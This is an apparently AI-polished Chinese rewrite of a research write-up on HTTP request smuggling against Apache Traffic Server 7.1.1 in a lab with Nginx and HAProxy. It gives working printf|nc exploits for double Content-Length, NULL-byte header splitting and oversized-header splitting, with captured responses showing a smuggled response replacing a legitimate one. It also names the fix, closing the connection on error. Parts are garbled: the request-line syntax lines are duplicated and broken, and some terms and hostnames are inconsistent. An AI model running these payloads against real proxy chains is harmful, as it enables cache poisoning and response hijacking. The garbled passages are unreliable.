### 优化后的文本

#### 请求按双重内容长度拆分
让我们深入探讨HTTP走私攻击的基础。根据RFC 7230 3.3.3的规定，**禁止使用双重Content-Length标头**：
> 如果接收到的消息没有传输编码，并且具有不同字段值的多个Content-Length头字段或具有无效值的单个Content-Length头字段，则消息帧无效，并且接收者必须将其视为不可恢复的错误。如果这是一个请求消息，服务器必须以400状态码响应，然后关闭连接。如果这是代理收到的响应消息，代理必须关闭与服务器的连接，丢弃收到的响应，并向客户端发送502（错误网关）响应。如果这是用户代理收到的响应消息，用户代理必须关闭与服务器的连接并丢弃收到的响应。

基于Content-Length标头顺序的不同解释是首次证明的HTTP走私攻击（2005年）。直接在ATS上发送这样的查询会生成两个响应（一个400和一个200）：

```bash
printf 'GET /index.html?toto=1 HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'Content-Length: 0\r\n'\
'Content-Length: 66\r\n'\
'\r\n'\
'GET /index.html?toto=2 HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8007
```

常规响应应为400错误。使用端口8001（HaProxy）无效，因为HaProxy是一个强大的HTTP代理，不会被这种简单的技巧欺骗。

这是经典的“关键请求拆分”，但在反向代理链中使用强大工具时，在现实环境中难以重现。为什么这很重要？因为您可能会认为ATS健壮，并在其前后使用新的未知HTTP服务器，期望能正确检测到这种走私攻击。

另一个关键因素是，HTTP解析中的任何其他问题都可能利用此双重Content-Length。假设存在另一个问题，使得我们可以隐藏某个标头但对ATS显示该标头。那么我们只需要将这个隐藏的标头用于第二个Content-Length，就可以完成操作而不被先前的参与者阻止。例如，ATS有一个带有“space-before-:”的隐藏标头问题，我们将在后面进行分析。

#### 通过NULL字符注入请求
这个示例不易理解，也不是最大的影响，因为我们使用了一个非常糟糕的查询进行攻击，很容易被检测到。但我喜欢神奇的NULL (\0) 字符。

在标头中使用NULL字节字符会触发ATS的查询拒绝，这是合理的，但也可能导致提前结束查询，如果在出现第一个错误后未关闭管道，则可能会发生不良情况。下一行会被解释为管道中的下一个查询。

因此，像这样的有效管道：

```bash
01 GET /does-not-exists.html?foofoo=1 HTTP/1.1\r\n
02 X-Something: \0 something\r\n
03 X-Foo: Bar\r\n
04 \r\n
05 GET /index.html?bar=1 HTTP/1.1\r\n
06 Host: dummy-host7.example.com\r\n
07 \r\n
```

生成两个400错误。因为第二个查询以X-Foo开头：Bar \r\n，所以这是无效的第一条查询行。

让我们测试一个无效的管道（因为两个查询之间没有\r\n）：

```bash
01 GET /does-not-exists.html?foofoo=2 HTTP/1.1\r\n
02 X-Something: \0 something\r\n
03 GET /index.html?bar=2 HTTP/1.1\r\n
04 Host: dummy-host7.example.com\r\n
05 \r\n
```

它生成一个400错误和一个200 OK响应。第03/04/05行被视为有效查询。这已经是HTTP请求攻击。

但是，第03行不是一个完美的标头行，大多数代理程序都会拒绝。不能将其视为唯一的有效查询。伪造的管道将作为错误查询而被早期检测到，我的意思是第03行显然不是有效的标头行。

对于第一行，语法是以下两行之一：
- [SP][SP]HTTP/[M].[m][CR][LF]
- [SP][SP]HTTP/[M].[m][CR][LF] (absolute uri)

`LOCATION`可以用于插入标头行中所需的特殊[:]，特别是在查询字符串部分，但这会在HEADER-NAME-NO-SPACE部分中注入许多不良字符，例如'/' 或 '?'。

让我们尝试使用ABSOLUTE-URI替代语法，其中[:]在行上的显示速度更快，并且标头名称唯一的错误字符是空格。这也将修复双主机标头的潜在存在（绝对uri会替换主机标头）。

```bash
01 GET /does-not-exists.html?foofoo=2 HTTP/1.1\r\n
02 Host: dummy-host7.example.com\r\n
03 X-Something: \0 something\r\n
04 GET http://dummy-host7.example.com/index.html?bar=2 HTTP/1.1\r\n
05 \r\n
```

在这里，成为查询的错误标头是第04行，标头名称是GET http，标头值为`//dummy-host7.example.com/index.html?bar=2 HTTP/1.1`。那仍然是无效的标头（标头名称包含空格），但我很确定我们可以找到一些HTTP代理来传输此标头（ATS证明了这一点，标头名称中允许使用空格字符）。

使用此技巧的实际攻击如下所示：

```bash
printf 'GET /something.html?zorg=1 HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'X-Something: "\0something"\r\n'\
'GET http://dummy-host7.example.com/index.html?replacing=1&zorg=2 HTTP/1.1\r\n'\
'\r\n'\
'GET /targeted.html?replaced=maybe&zorg=3 HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8007
```

这只是两个查询（第一个查询有两个错误的标头，一个标有NULL，一个标头名称中有一个空格），对于ATS，它是三个查询。常规的第二个（/targeted.html）将获得隐藏查询的响应（`http://dummy-host.example.com/index.html?replacing=1&zorg=2`）。检查`X-Location-echo:`由Nginx添加。之后，ATS添加了一个第三个响应，即404，但是前一个参与者仅期望两个响应，而第二个响应已被替换。

响应示例：

```http
HTTP/1.1 400 Invalid HTTP Request
Date: Fri, 26 Oct 2018 15:34:53 GMT
Connection: keep-alive
Server: ATS/7.1.1
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 220
Bad Request
Bad Request
Description: Could not process this request.

HTTP/1.1 200 OK
Server: ATS/7.1.1
Date: Fri, 26 Oct 2018 15:34:53 GMT
Content-Type: text/html
Content-Length: 120
Last-Modified: Fri, 26 Oct 2018 14:16:28 GMT
ETag: "5bd321bc-78"
X-Location-echo: /index.html?replacing=1&zorg=2
X-Default-VH: 0
Cache-Control: public, max-age=300
Accept-Ranges: bytes
Age: 0
Connection: keep-alive
$Nginx default static page
Hello World
It works!

HTTP/1.1 404 Not Found
Server: ATS/7.1.1
Date: Fri, 26 Oct 2018 15:34:53 GMT
Content-Type: text/html
Content-Length: 153
Age: 0
Connection: keep-alive
404 Not Found
404 Not Found
nginx/1.15.5
```

如果尝试使用端口8001（因此通过HaProxy进行传输），则不会获得预期的攻击结果。

```http
HTTP/1.0 400 Bad request
Cache-Control: no-cache
Connection: close
Content-Type: text/html
400 Bad request
Your browser sent an invalid request.
```

这是HTTP请求拆分攻击，但实际使用情况可能很难找到。ATS的解决方法是“错误时关闭”，当触发400错误时，流水线停止运行，错误发生后套接字将关闭。

#### 使用标头进行请求拆分，提早结束查询
这次攻击与上一次攻击几乎相同，但不需要神奇的NULL字符即可触发查询结束事件。通过使用大小约为65536个字符的标头，我们可以触发此事件，并以与查询NULL提前结束的方式相同的方式利用该事件。

关于`printf`的注释，其中包含`printf`产生的巨大标头。在这里，我使用一个包含很多重复字符（例如=或1）的标头生成查询：
`X: ==============( 65 532 '=' )========================\r\n`

我们可以在`printf`中使用`%ns`格式来生成此格式，从而生成大量空格。但是要做到这一点，我们需要用`tr`替换一些特殊字符，并使用_代替原始字符串中的空格：

```bash
printf 'X:_"%65532s"\r\n' | tr " " "=" | tr "_" " "
```

尝试对Nginx：

```bash
printf 'GET_/something.html?zorg=6_HTTP/1.1\r\n'\
'Host:_dummy-host7.example.com\r\n'\
'X:_"%65532s"\r\n'\
'GET_http://dummy-host7.example.com/index.html?replaced=0&cache=8_HTTP/1.1\r\n'\
'\r\n'\
|tr " " "1"\
|tr "_" " "\
|nc -q 1 127.0.0.1 8002
```

我发现一个400错误，这是正常的。Nginx不喜欢巨大的标头。

现在尝试针对ATS7：

```bash
printf 'GET_/something.html?zorg2=5_HTTP/1.1\r\n'\
'Host:_dummy-host7.example.com\r\n'\
'X:_"%65534s"\r\n'\
'GET_http://dummy-host7.example.com/index.html?replaced=0&cache=8_HTTP/1.1\r\n'\
'\r\n'\
|tr " " "1"\
|tr "_" " "\
|nc -q 1 127.0.0.1 8007
```

在400错误之后，我们将收到200 OK响应。与前面的示例相同的问题，并且相同的修复程序。在这里，我们仍然有一个标头包含空格且标头很大的查询，但没有NULL字符。然而，65000个字符非常大，大多数参与者会在一行中输入8000个字符后拒绝查询。

响应示例：

```http
HTTP/1.1 400 Invalid HTTP Request
Date: Fri, 26 Oct 2018 15:40:17 GMT
Connection: keep-alive
Server: ATS/7.1.1
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 220
Bad Request
Bad Request
Description: Could not process this request.

HTTP/1.1 200 OK
Server: ATS/7.1.1
Date: Fri, 26 Oct 2018 15:40:17 GMT
Content-Type: text/html
Content-Length: 120
Last-Modified: Fri, 26 Oct 2018 14:16:28 GMT
ETag: "5bd321bc-78"
X-Location-echo: /index.html?replaced=0&cache=8
X-Default-VH: 0
Cache-Control: public, max-age=300
Accept-Ranges: bytes
Age: 0
Connection: keep-alive
```

希望这些优化使文本更加清晰、连贯和专业。如果有任何进一步的需求，请告诉我！